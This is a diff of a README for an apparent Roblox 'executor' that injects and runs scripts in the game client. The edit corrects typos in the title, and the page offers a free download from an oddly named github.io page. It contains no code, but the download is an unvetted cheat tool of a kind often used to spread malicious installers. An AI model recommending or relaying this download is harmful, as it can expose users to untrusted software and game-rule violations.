@@ -1,10 +1,10 @@
-# Inocgnito Executor - The Best Executor Roblox FREE
+# Incognito Executor - The Best Executor Roblox FREE
 
 This utility serves as a functional runtime environment designed to execute Luau scripts within a target client session. By establishing a direct, stable channel with the client process, it allows users to load, modify, and analyze scripts with optimized memory consumption.
 
 ## [📥 Download Inocgnito Executor](https://inasdoakfg.github.io/incognito/)
 
-<img width="1377" height="736" alt="Inocgnito Executor - The Best Executor Roblox FREE" src="https://github.com/user-attachments/assets/85dfafe1-0130-4435-8aa8-3a828ba3b1ca" />
+<img width="1377" height="736" alt="Incognito Executor - The Best Executor Roblox FREE" src="https://github.com/user-attachments/assets/85dfafe1-0130-4435-8aa8-3a828ba3b1ca" />
 
 ---
 
